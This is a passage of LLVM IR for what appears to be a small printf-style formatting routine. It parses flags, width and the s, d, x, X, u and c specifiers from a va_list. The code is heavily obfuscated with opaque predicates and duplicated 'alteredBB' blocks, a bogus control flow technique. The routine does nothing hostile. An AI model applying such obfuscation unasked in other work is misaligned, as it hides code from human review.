  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i8*, i8** %5, align 8
  %46 = load i8, i8* %45, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 45
  %49 = load i32, i32* @x.31
  %50 = load i32, i32* @y.32
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %48, label %57, label %60

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i8*, i8** %5, align 8
  %59 = getelementptr inbounds i8, i8* %58, i32 1
  store i8* %59, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %60

; <label>:60:                                     ; preds = %57, %originalBBpart2
  br label %61

; <label>:61:                                     ; preds = %66, %60
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 48
  br i1 %65, label %66, label %71

; <label>:66:                                     ; preds = %61
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %5, align 8
  %69 = load i32, i32* %8, align 4
  %70 = or i32 %69, 2
  store i32 %70, i32* %8, align 4
  br label %61

; <label>:71:                                     ; preds = %61
  br label %72

; <label>:72:                                     ; preds = %originalBBpart212, %71
  %73 = load i8*, i8** %5, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp sge i32 %75, 48
  br i1 %76, label %77, label %98

; <label>:77:                                     ; preds = %72
  %78 = load i32, i32* @x.31
  %79 = load i32, i32* @y.32
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %77
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sle i32 %88, 57
  %90 = load i32, i32* @x.31
  %91 = load i32, i32* @y.32
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %98

; <label>:98:                                     ; preds = %originalBBpart24, %72
  %99 = phi i1 [ false, %72 ], [ %89, %originalBBpart24 ]
  %100 = load i32, i32* @x.31
  %101 = load i32, i32* @y.32
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %98
  %108 = load i32, i32* @x.31
  %109 = load i32, i32* @y.32
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %99, label %116, label %144

; <label>:116:                                    ; preds = %originalBBpart28
  %117 = load i32, i32* %7, align 4
  %118 = mul nsw i32 %117, 10
  store i32 %118, i32* %7, align 4
  %119 = load i8*, i8** %5, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = sub nsw i32 %121, 48
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, %122
  store i32 %124, i32* %7, align 4
  br label %125

; <label>:125:                                    ; preds = %116
  %126 = load i32, i32* @x.31
  %127 = load i32, i32* @y.32
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %125
  %134 = load i8*, i8** %5, align 8
  %135 = getelementptr inbounds i8, i8* %134, i32 1
  store i8* %135, i8** %5, align 8
  %136 = load i32, i32* @x.31
  %137 = load i32, i32* @y.32
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %72

; <label>:144:                                    ; preds = %originalBBpart28
  %145 = load i32, i32* @x.31
  %146 = load i32, i32* @y.32
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %144
  %153 = load i8*, i8** %5, align 8
  %154 = load i8, i8* %153, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 115
  %157 = load i32, i32* @x.31
  %158 = load i32, i32* @y.32
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %156, label %165, label %263

; <label>:165:                                    ; preds = %originalBBpart216
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 8
  %169 = icmp ule i32 %168, 40
  br i1 %169, label %170, label %192

; <label>:170:                                    ; preds = %165
  %171 = load i32, i32* @x.31
  %172 = load i32, i32* @y.32
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %170
  %179 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %166, i32 0, i32 3
  %180 = load i8*, i8** %179, align 8
  %181 = getelementptr i8, i8* %180, i32 %168
  %182 = bitcast i8* %181 to i32*
  %183 = add i32 %168, 8
  store i32 %183, i32* %167, align 8
  %184 = load i32, i32* @x.31
  %185 = load i32, i32* @y.32
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart221, label %originalBB18alteredBB

originalBBpart221:                                ; preds = %originalBB18
  br label %197

; <label>:192:                                    ; preds = %165
  %193 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %166, i32 0, i32 2
  %194 = load i8*, i8** %193, align 8
  %195 = bitcast i8* %194 to i32*
  %196 = getelementptr i8, i8* %194, i32 8
  store i8* %196, i8** %193, align 8
  br label %197

; <label>:197:                                    ; preds = %192, %originalBBpart221
  %198 = phi i32* [ %182, %originalBBpart221 ], [ %195, %192 ]
  %199 = load i32, i32* @x.31
  %200 = load i32, i32* @y.32
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %197
  %207 = load i32, i32* %198, align 4
  %208 = sext i32 %207 to i64
  %209 = inttoptr i64 %208 to i8*
  store i8* %209, i8** %11, align 8
  %210 = load i8**, i8*** %4, align 8
  %211 = load i8*, i8** %11, align 8
  %212 = icmp ne i8* %211, null
  %213 = load i32, i32* @x.31
  %214 = load i32, i32* @y.32
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %212, label %221, label %239

; <label>:221:                                    ; preds = %originalBBpart225
  %222 = load i32, i32* @x.31
  %223 = load i32, i32* @y.32
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %221
  %230 = load i8*, i8** %11, align 8
  %231 = load i32, i32* @x.31
  %232 = load i32, i32* @y.32
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %240

; <label>:239:                                    ; preds = %originalBBpart225
  br label %240

; <label>:240:                                    ; preds = %239, %originalBBpart229
  %241 = phi i8* [ %230, %originalBBpart229 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.970, i32 0, i32 0), %239 ]
  %242 = load i32, i32* @x.31
  %243 = load i32, i32* @y.32
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %240
  %250 = load i32, i32* %7, align 4
  %251 = load i32, i32* %8, align 4
  %252 = call i32 @prints(i8** %210, i8* %241, i32 %250, i32 %251)
  %253 = load i32, i32* %9, align 4
  %254 = add nsw i32 %253, %252
  store i32 %254, i32* %9, align 4
  %255 = load i32, i32* @x.31
  %256 = load i32, i32* @y.32
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart248, label %originalBB31alteredBB

originalBBpart248:                                ; preds = %originalBB31
  br label %571

; <label>:263:                                    ; preds = %originalBBpart216
  %264 = load i32, i32* @x.31
  %265 = load i32, i32* @y.32
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %263
  %272 = load i8*, i8** %5, align 8
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 100
  %276 = load i32, i32* @x.31
  %277 = load i32, i32* @y.32
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %275, label %284, label %325

; <label>:284:                                    ; preds = %originalBBpart252
  %285 = load i8**, i8*** %4, align 8
  %286 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %287 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 8
  %289 = icmp ule i32 %288, 40
  br i1 %289, label %290, label %312

; <label>:290:                                    ; preds = %284
  %291 = load i32, i32* @x.31
  %292 = load i32, i32* @y.32
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %290
  %299 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 3
  %300 = load i8*, i8** %299, align 8
  %301 = getelementptr i8, i8* %300, i32 %288
  %302 = bitcast i8* %301 to i32*
  %303 = add i32 %288, 8
  store i32 %303, i32* %287, align 8
  %304 = load i32, i32* @x.31
  %305 = load i32, i32* @y.32
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBBpart267, label %originalBB54alteredBB

originalBBpart267:                                ; preds = %originalBB54
  br label %317

; <label>:312:                                    ; preds = %284
  %313 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 2
  %314 = load i8*, i8** %313, align 8
  %315 = bitcast i8* %314 to i32*
  %316 = getelementptr i8, i8* %314, i32 8
  store i8* %316, i8** %313, align 8
  br label %317

; <label>:317:                                    ; preds = %312, %originalBBpart267
  %318 = phi i32* [ %302, %originalBBpart267 ], [ %315, %312 ]
  %319 = load i32, i32* %318, align 4
  %320 = load i32, i32* %7, align 4
  %321 = load i32, i32* %8, align 4
  %322 = call i32 @printi(i8** %285, i32 %319, i32 10, i32 1, i32 %320, i32 %321, i32 97)
  %323 = load i32, i32* %9, align 4
  %324 = add nsw i32 %323, %322
  store i32 %324, i32* %9, align 4
  br label %571

; <label>:325:                                    ; preds = %originalBBpart252
  %326 = load i8*, i8** %5, align 8
  %327 = load i8, i8* %326, align 1
  %328 = zext i8 %327 to i32
  %329 = icmp eq i32 %328, 120
  br i1 %329, label %330, label %371

; <label>:330:                                    ; preds = %325
  %331 = load i32, i32* @x.31
  %332 = load i32, i32* @y.32
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %330
  %339 = load i8**, i8*** %4, align 8
  %340 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %341 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %340, i32 0, i32 0
  %342 = load i32, i32* %341, align 8
  %343 = icmp ule i32 %342, 40
  %344 = load i32, i32* @x.31
  %345 = load i32, i32* @y.32
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %343, label %352, label %358

; <label>:352:                                    ; preds = %originalBBpart271
  %353 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %340, i32 0, i32 3
  %354 = load i8*, i8** %353, align 8
  %355 = getelementptr i8, i8* %354, i32 %342
  %356 = bitcast i8* %355 to i32*
  %357 = add i32 %342, 8
  store i32 %357, i32* %341, align 8
  br label %363

; <label>:358:                                    ; preds = %originalBBpart271
  %359 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %340, i32 0, i32 2
  %360 = load i8*, i8** %359, align 8
  %361 = bitcast i8* %360 to i32*
  %362 = getelementptr i8, i8* %360, i32 8
  store i8* %362, i8** %359, align 8
  br label %363

; <label>:363:                                    ; preds = %358, %352
  %364 = phi i32* [ %356, %352 ], [ %361, %358 ]
  %365 = load i32, i32* %364, align 4
  %366 = load i32, i32* %7, align 4
  %367 = load i32, i32* %8, align 4
  %368 = call i32 @printi(i8** %339, i32 %365, i32 16, i32 0, i32 %366, i32 %367, i32 97)
  %369 = load i32, i32* %9, align 4
  %370 = add nsw i32 %369, %368
  store i32 %370, i32* %9, align 4
  br label %571

; <label>:371:                                    ; preds = %325
  %372 = load i8*, i8** %5, align 8
  %373 = load i8, i8* %372, align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 88
  br i1 %375, label %376, label %417

; <label>:376:                                    ; preds = %371
  %377 = load i8**, i8*** %4, align 8
  %378 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %379 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 0
  %380 = load i32, i32* %379, align 8
  %381 = icmp ule i32 %380, 40
  br i1 %381, label %382, label %388

; <label>:382:                                    ; preds = %376
  %383 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 3
  %384 = load i8*, i8** %383, align 8
  %385 = getelementptr i8, i8* %384, i32 %380
  %386 = bitcast i8* %385 to i32*
  %387 = add i32 %380, 8
  store i32 %387, i32* %379, align 8
  br label %393

; <label>:388:                                    ; preds = %376
  %389 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %378, i32 0, i32 2
  %390 = load i8*, i8** %389, align 8
  %391 = bitcast i8* %390 to i32*
  %392 = getelementptr i8, i8* %390, i32 8
  store i8* %392, i8** %389, align 8
  br label %393

; <label>:393:                                    ; preds = %388, %382
  %394 = phi i32* [ %386, %382 ], [ %391, %388 ]
  %395 = load i32, i32* @x.31
  %396 = load i32, i32* @y.32
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %393
  %403 = load i32, i32* %394, align 4
  %404 = load i32, i32* %7, align 4
  %405 = load i32, i32* %8, align 4
  %406 = call i32 @printi(i8** %377, i32 %403, i32 16, i32 0, i32 %404, i32 %405, i32 65)
  %407 = load i32, i32* %9, align 4
  %408 = add nsw i32 %407, %406
  store i32 %408, i32* %9, align 4
  %409 = load i32, i32* @x.31
  %410 = load i32, i32* @y.32
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart283, label %originalBB73alteredBB

originalBBpart283:                                ; preds = %originalBB73
  br label %571

; <label>:417:                                    ; preds = %371
  %418 = load i8*, i8** %5, align 8
  %419 = load i8, i8* %418, align 1
  %420 = zext i8 %419 to i32
  %421 = icmp eq i32 %420, 117
  br i1 %421, label %422, label %463

; <label>:422:                                    ; preds = %417
  %423 = load i8**, i8*** %4, align 8
  %424 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %425 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 8
  %427 = icmp ule i32 %426, 40
  br i1 %427, label %428, label %434

; <label>:428:                                    ; preds = %422
  %429 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 3
  %430 = load i8*, i8** %429, align 8
  %431 = getelementptr i8, i8* %430, i32 %426
  %432 = bitcast i8* %431 to i32*
  %433 = add i32 %426, 8
  store i32 %433, i32* %425, align 8
  br label %455

; <label>:434:                                    ; preds = %422
  %435 = load i32, i32* @x.31
  %436 = load i32, i32* @y.32
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %434
  %443 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 2
  %444 = load i8*, i8** %443, align 8
  %445 = bitcast i8* %444 to i32*
  %446 = getelementptr i8, i8* %444, i32 8
  store i8* %446, i8** %443, align 8
  %447 = load i32, i32* @x.31
  %448 = load i32, i32* @y.32
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %455

; <label>:455:                                    ; preds = %originalBBpart287, %428
  %456 = phi i32* [ %432, %428 ], [ %445, %originalBBpart287 ]
  %457 = load i32, i32* %456, align 4
  %458 = load i32, i32* %7, align 4
  %459 = load i32, i32* %8, align 4
  %460 = call i32 @printi(i8** %423, i32 %457, i32 10, i32 0, i32 %458, i32 %459, i32 97)
  %461 = load i32, i32* %9, align 4
  %462 = add nsw i32 %461, %460
  store i32 %462, i32* %9, align 4
  br label %571

; <label>:463:                                    ; preds = %417
  %464 = load i32, i32* @x.31
  %465 = load i32, i32* @y.32
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %463
  %472 = load i8*, i8** %5, align 8
  %473 = load i8, i8* %472, align 1
  %474 = zext i8 %473 to i32
  %475 = icmp eq i32 %474, 99
  %476 = load i32, i32* @x.31
  %477 = load i32, i32* @y.32
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br i1 %475, label %484, label %545

; <label>:484:                                    ; preds = %originalBBpart291
  %485 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %486 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %485, i32 0, i32 0
  %487 = load i32, i32* %486, align 8
  %488 = icmp ule i32 %487, 40
  br i1 %488, label %489, label %511

; <label>:489:                                    ; preds = %484
  %490 = load i32, i32* @x.31
  %491 = load i32, i32* @y.32
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %489
  %498 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %485, i32 0, i32 3
  %499 = load i8*, i8** %498, align 8
  %500 = getelementptr i8, i8* %499, i32 %487
  %501 = bitcast i8* %500 to i32*
  %502 = add i32 %487, 8
  store i32 %502, i32* %486, align 8
  %503 = load i32, i32* @x.31
  %504 = load i32, i32* @y.32
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBBpart2102, label %originalBB93alteredBB

originalBBpart2102:                               ; preds = %originalBB93
  br label %532

; <label>:511:                                    ; preds = %484
  %512 = load i32, i32* @x.31
  %513 = load i32, i32* @y.32
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %511
  %520 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %485, i32 0, i32 2
  %521 = load i8*, i8** %520, align 8
  %522 = bitcast i8* %521 to i32*
  %523 = getelementptr i8, i8* %521, i32 8
  store i8* %523, i8** %520, align 8
  %524 = load i32, i32* @x.31
  %525 = load i32, i32* @y.32
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %532

; <label>:532:                                    ; preds = %originalBBpart2106, %originalBBpart2102
  %533 = phi i32* [ %501, %originalBBpart2102 ], [ %522, %originalBBpart2106 ]
  %534 = load i32, i32* %533, align 4
  %535 = trunc i32 %534 to i8
  %536 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %535, i8* %536, align 1
  %537 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %537, align 1
  %538 = load i8**, i8*** %4, align 8
  %539 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %540 = load i32, i32* %7, align 4
  %541 = load i32, i32* %8, align 4
  %542 = call i32 @prints(i8** %538, i8* %539, i32 %540, i32 %541)
  %543 = load i32, i32* %9, align 4
  %544 = add nsw i32 %543, %542
  store i32 %544, i32* %9, align 4
  br label %571

; <label>:545:                                    ; preds = %originalBBpart291
  br label %554

; <label>:546:                                    ; preds = %17
  br label %547

; <label>:547:                                    ; preds = %546, %35
  %548 = load i8**, i8*** %4, align 8
  %549 = load i8*, i8** %5, align 8
  %550 = load i8, i8* %549, align 1
  %551 = zext i8 %550 to i32
  call void @printchar(i8** %548, i32 %551)
  %552 = load i32, i32* %9, align 4
  %553 = add nsw i32 %552, 1
  store i32 %553, i32* %9, align 4
  br label %554

; <label>:554:                                    ; preds = %547, %545
  %555 = load i32, i32* @x.31
  %556 = load i32, i32* @y.32
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %554
  %563 = load i32, i32* @x.31
  %564 = load i32, i32* @y.32
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %571

; <label>:571:                                    ; preds = %originalBBpart2110, %532, %455, %originalBBpart283, %363, %317, %originalBBpart248
  %572 = load i8*, i8** %5, align 8
  %573 = getelementptr inbounds i8, i8* %572, i32 1
  store i8* %573, i8** %5, align 8
  br label %12

; <label>:574:                                    ; preds = %29, %12
  %575 = load i32, i32* @x.31
  %576 = load i32, i32* @y.32
  %577 = sub i32 %575, 1
  %578 = mul i32 %575, %577
  %579 = urem i32 %578, 2
  %580 = icmp eq i32 %579, 0
  %581 = icmp slt i32 %576, 10
  %582 = or i1 %580, %581
  br i1 %582, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %574
  %583 = load i8**, i8*** %4, align 8
  %584 = icmp ne i8** %583, null
  %585 = load i32, i32* @x.31
  %586 = load i32, i32* @y.32
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %584, label %593, label %612

; <label>:593:                                    ; preds = %originalBBpart2114
  %594 = load i32, i32* @x.31
  %595 = load i32, i32* @y.32
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %593
  %602 = load i8**, i8*** %4, align 8
  %603 = load i8*, i8** %602, align 8
  store i8 0, i8* %603, align 1
  %604 = load i32, i32* @x.31
  %605 = load i32, i32* @y.32
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %612

; <label>:612:                                    ; preds = %originalBBpart2118, %originalBBpart2114
  %613 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %614 = bitcast %struct.__va_list_tag* %613 to i8*
  call void @llvm.va_end(i8* %614)
  %615 = load i32, i32* %9, align 4
  ret i32 %615

originalBBalteredBB:                              ; preds = %originalBB, %36
